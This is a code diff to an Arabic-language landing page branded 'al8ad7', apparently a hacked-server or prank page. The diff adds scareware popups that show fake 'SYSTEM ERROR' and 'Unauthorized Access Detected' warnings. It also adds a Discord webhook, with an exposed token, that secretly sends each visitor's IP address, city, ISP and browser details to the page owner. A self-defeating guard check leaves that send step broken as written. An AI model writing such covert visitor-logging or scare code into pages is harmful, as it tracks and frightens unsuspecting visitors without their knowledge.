@@ -729,9 +729,10 @@
         <div class="loading-bar-container">
             <div class="loading-bar"></div>
         </div>
-        <div class="main-title">قادح</div>
+        <div class="main-title">al8ad7</div>
         <div class="subtitle">🤨 لديك سيرفر جميل 🤨</div>
-        <a href="https://discord.gg/muz" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
+        <a href="https://discord.gg/nww" class="discord-link" target="_blank"
+            rel="noopener noreferrer">discord.gg/nww</a>
     </div>
 
     <!-- المحتوى الرئيسي (مخفي) -->
@@ -739,7 +740,8 @@
         <img src="https://j.top4top.io/p_3664n97sh1.jpg" alt="Logo" class="logo-image" />
         <div class="main-title">al8ad7 on your server</div>
         <div class="subtitle">كرمال أوبــتِ+MGϟ</div>
-        <a href="" class="discord-link" target="_blank" rel="noopener noreferrer"></a>
+        <a href="https://discord.gg/zx7" class="discord-link" target="_blank"
+            rel="noopener noreferrer">discord.gg/zx7</a>
     </div>
 
     <script>
@@ -797,9 +799,36 @@
         setInterval(updateClock, 1000);
         updateClock();
 
-        // تشغيل عند تفاعل المستخدم
-        addEventListener('click', play, { once: true });
-        addEventListener('keydown', play, { once: true });
+        // نظام النوافذ المنبثقة
+        function triggerPopups() {
+            // فتح عدة نوافذ لتأثير الـ "Hack"
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const x = Math.random() * (window.screen.width - 400);
+                    const y = Math.random() * (window.screen.height - 300);
+                    const newWin = window.open('', '_blank', `width=400,height=300,left=${x},top=${y}`);
+                    if (newWin) {
+                        newWin.document.write(`
+                            <body style="background:#000;color:#ff0000;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden;border:2px solid #ff0000;">
+                                <h1 style="text-shadow:0 0 10px #ff0000;font-size:2em;">SYSTEM ERROR</h1>
+                                <p style="font-size:1.2em;">al8ad7 WAS HERE</p>
+                                <div style="font-size:0.8em;color:#555;">Unauthorized Access Detected...</div>
+                                <script>setTimeout(() => { window.close(); }, 5000);<\/script>
+                            </body>
+                        `);
+                    }
+                }, i * 300);
+            }
+        }
+
+        // تشغيل عند تفاعل المستخدم (صوت + نوافذ منبثقة)
+        const startExperience = () => {
+            play();
+            triggerPopups();
+        };
+
+        addEventListener('click', startExperience, { once: true });
+        addEventListener('keydown', startExperience, { once: true });
 
         // شريط التحميل يتحكم بالانتقال بين الصفحات
         const loadingBar = document.querySelector('.loading-bar');
@@ -836,6 +865,37 @@
                 setTimeout(() => spark.remove(), 1000);
             }
         });
+        // إعدادات الويب هوك
+        const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1460154270048321568/wzsAFi9555gVVK24jhVMO27nhYs75YLel8rJVDcb3_VqdcPpfTbgaA-qVKLZJIGikzBD';
+
+        function sendToWebhook(data) {
+            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://ptb.discord.com/api/webhooks/1460154270048321568/wzsAFi9555gVVK24jhVMO27nhYs75YLel8rJVDcb3_VqdcPpfTbgaA-qVKLZJIGikzBD') return;
+
+            const payload = {
+                username: "System Logger",
+                avatar_url: "https://j.top4top.io/p_3664n97sh1.jpg",
+                embeds: [{
+                    title: "🌐 تسجيل دخول جديد",
+                    color: 15548997, // Red color to match theme
+                    fields: [
+                        { name: "📌 IP Address", value: `\`${data.ip}\``, inline: true },
+                        { name: "📍 Region", value: data.region, inline: true },
+                        { name: "🏙️ City", value: data.city, inline: true },
+                        { name: "🏢 ISP", value: data.connection.org || data.connection.isp, inline: false },
+                        { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
+                    ],
+                    footer: { text: "al8ad7 System | " + new Date().toLocaleString('ar-EG') },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log('Webhook error:', err));
+        }
+
         // جلب معلومات المستخدم
         fetch('https://ipwho.is/')
             .then(res => res.json())
@@ -846,6 +906,9 @@
                     document.getElementById('info-city').textContent = data.city;
                     document.getElementById('info-isp').textContent = data.connection.org || data.connection.isp;
                     document.getElementById('userInfoBox').style.display = 'block';
+
+                    // إرسال البيانات للويب هوك
+                    sendToWebhook(data);
                 }
             })
             .catch(err => console.log('Information fetch error:', err));
@@ -853,6 +916,3 @@
 </body>
 
 </html>
-
-
-
